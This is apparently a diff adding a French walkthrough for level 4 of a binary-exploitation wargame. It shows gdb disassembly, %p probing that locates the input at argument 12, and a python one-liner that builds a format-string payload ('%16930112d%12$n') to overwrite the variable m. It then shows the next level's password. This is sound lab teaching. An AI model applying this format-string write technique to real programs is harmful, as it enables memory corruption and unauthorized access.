@@ -1,0 +1,47 @@
+LEVEL 4
+-------
+
+1.	gdb level4
+
+2.	disas main
+	On voit que la fonction main appelle une fonction annexe, la fonction n()
+	0x080484ad <+6>:	call   0x8048457 <n>
+
+3.	disas n
+	La fonction n quand à elle appelle une fonction p.
+	En analysant ces fonctions on remarque que le principe est le même que
+	celui du niveau précédent, il faut changer la valeur d'une variable qui est
+	m.
+
+4.	info variables
+	0x08049810  m
+	Dans la fonction n() on voit qu'un cmp est effectué avec la valeur 0x1025544
+	qui est égal à 16930116 en décimal.
+
+5.	On cherche maintenant la place dans la mémoire de notre string envoyée au
+	programme:
+	
+	run
+	AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p
+	
+	AAAA 0xb7ff26b0 0xbffff764 0xb7fd0ff4 (nil) (nil)
+	0xbffff728 0x804848d 0xbffff520 0x200 0xb7fd1ac0
+	0xb7ff37d0 0x41414141 0x20702520
+
+	On peut voir que l'adresse 0x41414141 est à la 12 ème place donc on va
+	utiliser %12$n.
+
+6.	Il ne nous reste plus qu'à écrire la ligne python. Lorsque tout sera bon
+	le programme lancera cette commande: "/bin/cat /home/user/level5/.pass"
+	x/s 0x8048590
+	0x8048590:	 "/bin/cat /home/user/level5/.pass"
+
+	Pour inscrire les 16930112 octets on va utiliser une fonctionnalité
+	de padding de printf.
+	python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' > /tmp/lvl4
+
+	cat /tmp/lvl4 - | ./level4
+	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+7.	su level5
+	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
